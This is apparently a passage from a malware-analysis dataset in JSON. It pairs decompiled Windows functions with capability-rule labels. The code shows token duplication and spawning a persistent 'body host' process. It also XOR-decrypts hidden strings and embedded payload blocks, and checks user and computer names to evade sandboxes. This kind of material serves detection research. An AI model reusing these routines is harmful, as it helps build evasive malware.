= *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "0040f280": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040f280(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_64h;\n    int32_t *var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_48h;\n    uint pSessionId;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_ch._0_2_ = 0x1000;\n    piVar5 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar5 = 0;\n        piVar5 = piVar5 + 1;\n    }\n    puVar6 = &lpCommandLine;\n    var_60h = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    pSessionId = 0;\n    puVar6 = &var_68h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_48h = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.0040dc6c();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_64h = 0x20;\n                        var_68h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_68h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_54h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_54h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_48h = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x5733670f;\n                    var_34h = 0x670b4e2d;\n                    var_30h = 0x4e22572e;\n                    var_2ch._0_2_ = 0x6748;\n                    var_5ch = 6;\n                    var_2ch._2_1_ = 6;\n                    stack0xffffffd3 = 0x1d4e2757;\n                    var_25h = 0x22573c67;\n                    var_21h = 0x36670d4e;\n                    var_1dh = 0x784e3757;\n                    var_19h._0_1_ = 0x67;\n                    stack0xffffffe4 = 0x575a6778;\n                    var_14h._0_2_ = 0x4e43;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar7 = 0;\n                    var_58h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                        if (iVar3 != 0xa2a114) {\n                            *(iVar7 + iVar4) = *(&var_19h + iVar7 % var_5ch + 1) ^ (iVar7 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar7 = iVar7 + 1;\n                    } while (iVar7 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41db48);\n                    param_2 = var_60h;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_48h, var_8h, 0, &lpCommandLine, var_60h);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar7 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar7 != 0) {\n                            fcn.0040dc6c();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1764
    },
    "0040f530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f530(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar3 = 0x44;\n    puVar4 = param_1;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &var_44h;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_44h = 0x44;\n    puVar4 = &lpCommandLine;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41db48);\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (iVar2 == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x2d6, uVar1);\n        fcn.00401f6b(\"<%d>: BODYSPAWNER.CPP:%d > CreateBodyProcessAsCurrentUser2 : cant spawn body host, error=%d\", \n                     uVar1);\n    }\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 469
    },
    "0040f5d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f5d1(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uint uStack596;\n    int32_t iStack592;\n    uchar *puStack588;\n    uint uStack584;\n    uint uStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    uchar auStack528 [524];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41db60 == 0) {\n        uStack572 = 0x40f619;\n        *0x41dbc8 = fcn.0040f530();\n    }\n    else {\n        uStack572 = 0x40f60e;\n        *0x41dbc8 = fcn.0040f280();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentProcessId;\n    if (*0x41dbc8 == 0) {\n        uStack572 = 0x37a;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.00401f6b(\"<%d>: BODYSPAWNER.CPP:%d > UserSupportSubprocessThread2 : body host NOT spawned, restart thread\", \n                     uVar4);\n        piVar6 = &stack0xfffffdac;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdae >> 1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&stack0xfffffdac);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        uStack572 = 0x35b;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uStack584 = 0x40f63e;\n        fcn.00401f6b(\"<%d>: BODYSPAWNER.CPP:%d > UserSupportSubprocessThread2 : body host spawned\", uVar4);\n        uStack572 = 0x40f650;\n        fcn.0040d68a();\n        iStack552 = *0x41dbc8;\n        uStack572 = 0xffffffff;\n        uStack548 = *0x41db54;\n        puVar7 = &stack0xfffffdd8;\n        uStack584 = 2;\n        puStack588 = 0x40f674;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)();\n        puStack588 = &stack0xfffffdc4;\n        uStack572 = 0;\n        iStack592 = *0x41dbc8;\n        uStack596 = 0x40f689;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)();\n        uStack596 = puVar7;\n        uVar4 = (*pcVar2)(0x36b);\n        fcn.00401f6b(\"<%d>: BODYSPAWNER.CPP:%d > UserSupportSubprocessThread2 : host process terminated or crached. dwProcessExitCode=0x%08x\"\n                     , uVar4);\n        uStack596 = 0x1388;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41dbc8, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f5d1, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41dbc8);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1036
    },
    "0040f72d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f72d(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uint var_30ch;\n    uint var_104h;\n    \n    puVar5 = &var_104h;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &var_30ch;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x41db60 == 0) {\n        uVar3 = 0;\n        while (*(uVar3 + 0x4104c0) != arg_ch) {\n            uVar3 = uVar3 + 4;\n            if (0x2b < uVar3) {\n                return 1;\n            }\n        }\n        if (arg_10h == *0x41db58) {\n            return 1;\n        }\n        if (arg_ch == -0x37b0bf10) {\n            puVar5 = &var_104h;\n            for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_104h._0_1_ = 0;\n            if ((arg_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            pcVar6 = _sym.imp.KERNEL32.dll_lstrlenA;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n            if (iVar4 != 0) {\n                (*pcVar6)(&var_104h);\n                iVar4 = fcn.00409bc8();\n                if (iVar4 == -0x37b0bf10) {\n                    return 1;\n                }\n            }\n        }\n        iVar4 = fcn.0040d8dc();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        puVar5 = &var_30ch;\n        for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar4 = fcn.0040d68a();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x41dbd8);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        pcVar6 = fcn.0040db94;\n    }\n    else {\n        if (arg_ch != 0x74fc6984) {\n            return 1;\n        }\n        iVar4 = fcn.0040d8dc();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        iVar4 = fcn.0040d68a();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar4 + 8) = arg_10h;\n        pcVar6 = fcn.0040f5d1;\n        arg_10h = iVar4;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, pcVar6, arg_10h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    return 1;\n}\n",
        "token_count": 1072
    },
    "0040fab1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fab1(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41db60 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41db54, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41dbd8;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040d68a();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f5d1, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x4134a0) = *(uVar5 + 0x4134a0) ^ \"XbAtXhRUKArkYmp\"[uVar5 % 0xf];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x4178a0) = *(uVar5 + 0x4178a0) ^ str.bIG0iEw66qDxLA[uVar5 % 0xc];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f8e7, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41dab4 == 0) {\n        fcn.0040d469();\n        if (*0x41db60 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 693
    },
    "00401abf": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00401abf(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.00401317(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040d3e1();\n    }\n    return iVar1;\n}\n",
        "token_count": 183
    },
    "00409fee": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00409fee(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41db5c == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "00402233": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402233(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint pcbBuffer;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = fcn.0040207b();\n    if (iVar4 != 0) {\n        fcn.0040221b();\n    }\n    var_20h._0_2_ = 0x2e1d;\n    var_20h._2_1_ = 3;\n    var_20h._3_1_ = 0x59;\n    var_1ch._0_2_ = 0x152f;\n    var_1ch._2_1_ = 0x3c;\n    var_1ch._3_1_ = 0x4a;\n    var_18h._0_1_ = 0x55;\n    var_18h._1_1_ = 0x26;\n    var_18h._2_1_ = 0x15;\n    var_18h._3_1_ = 0x4c;\n    var_84h = 0x31644c79;\n    var_80h._0_1_ = 0x4a;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_48h = 5;\n    iVar14 = 0;\n    var_40h = &var_20h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0x2295c0) {\n            *(iVar14 + iVar4) = *(&var_84h + iVar14 % var_48h) ^ (iVar14 + iVar4)[&var_20h - iVar4];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0xc);\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 != 0) {\n        fcn.0040221b();\n    }\n    var_20h._0_2_ = 0x344b;\n    var_20h._2_1_ = 0x1a;\n    var_20h._3_1_ = 0x31;\n    var_1ch._0_2_ = 0x5435;\n    var_1ch._2_1_ = 0x3a;\n    var_1ch._3_1_ = 0x5d;\n    var_18h._0_1_ = 0x30;\n    var_18h._1_1_ = 0x3d;\n    var_18h._2_1_ = 0x54;\n    var_18h._3_1_ = 0x56;\n    var_7ch = 0x54735638;\n    var_78h._0_1_ = 0x51;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_84h = iVar14;\n    var_40h = &var_20h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar7 != 0x5b335e) {\n            *(iVar6 + iVar14) = *(&var_7ch + iVar6 % var_48h) ^ (iVar6 + iVar14)[&var_20h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 != 0) {\n        fcn.0040221b();\n    }\n    pcbBuffer = 0x400;\n    iVar14 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41dde0, &pcbBuffer);\n    if (iVar14 == 0) {\n        fcn.0040221b();\n    }\n    var_20h._0_2_ = 0x1228;\n    var_20h._2_1_ = 0;\n    var_20h._3_1_ = 0x34;\n    var_1ch._0_2_ = 0x2117;\n    var_1ch._2_1_ = 0x1f;\n    var_1ch._3_1_ = 0x32;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x23;\n    var_18h._2_1_ = 0;\n    var_18h._3_1_ = 0x4f;\n    var_8h = 0x4672676b;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4f72);\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_4ch = 6;\n    iVar6 = 0;\n    var_7ch = iVar14;\n    var_40h = &var_20h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar7 != 0x84c72b) {\n            *(iVar6 + iVar14) = *(&var_8h + iVar6 % var_4ch) ^ (iVar6 + iVar14)[&var_20h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar14 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 == 0) {\n        fcn.0040221b();\n    }\n    var_8h = 0x152b0b61;\n    var_4h = 0x45125d21;\n    var_74h = 0x71456a32;\n    var_70h._0_1_ = 0x43;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_40h = &var_8h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar7 != 0x27b6d3) {\n            *(iVar6 + iVar14) = *(&var_74h + iVar6 % var_48h) ^ (iVar6 + iVar14)[&var_8h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040221b();\n    }\n    pcbBuffer = 0x400;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41dde0, &pcbBuffer);\n    if (iVar6 == 0) {\n        fcn.0040221b();\n    }\n    var_8h = 0x10360d64;\n    var_4h = 0x78147825;\n    var_6ch = 0x54784c37;\n    var_68h._0_1_ = 0x67;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_74h = iVar6;\n    var_40h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar8 != 0xa4039b) {\n            *(iVar7 + iVar6) = *(&var_6ch + iVar7 % var_48h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040221b();\n    }\n    var_8h = 0x1e7e1a56;\n    var_4h = 0x37082833;\n    var_10h = 0x52374961;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x65);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_6ch = iVar6;\n    var_40h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar8 != 0x63896c) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_48h) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41dde0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040221b();\n    }\n    var_30h = 0x2b602e1c;\n    var_2ch._0_1_ = 0x33;\n    var_2ch._1_1_ = 0x15;\n    var_2ch._2_1_ = 0x3d;\n    var_2ch._3_1_ = 0x77;\n    var_28h._0_1_ = 0x33;\n    var_28h._1_1_ = 0x20;\n    var_28h._2_1_ = 0x11;\n    stack0xffffffd7 = 0x2d3d713c;\n    var_24h._3_1_ = 4;\n    var_20h._0_2_ = 0x7b3b;\n    var_20h._2_1_ = 0x20;\n    var_20h._3_1_ = 0x2a;\n    var_1ch._0_2_ = 0x3c08;\n    var_1ch._2_1_ = 0x4b;\n    var_1ch._3_1_ = 0x1c;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x31;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x32;\n    var_10h = 0x6f326f54;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 100);\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_40h = &var_30h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar8 != 0x69bc14) 